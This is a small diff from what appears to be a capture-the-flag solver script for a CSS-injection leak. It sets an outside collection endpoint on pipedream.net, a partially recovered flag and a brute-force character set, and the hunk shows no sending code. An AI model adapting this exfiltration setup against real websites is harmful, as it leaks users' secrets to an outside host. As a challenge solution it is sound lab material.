@@ -2,7 +2,7 @@ import string
 import urllib.parse
 
 ENDPOINT = "https://enmlxhlaaga2p.x.pipedream.net/"
-CURR_FLAG = "nite{n"
+CURR_FLAG = "nite{n0w_we_kn0w_h0w_10_h4ck_g00gl6_w1th_c5"
 CHARSET = string.ascii_letters + string.digits + "_-{}"
 
 css = ""
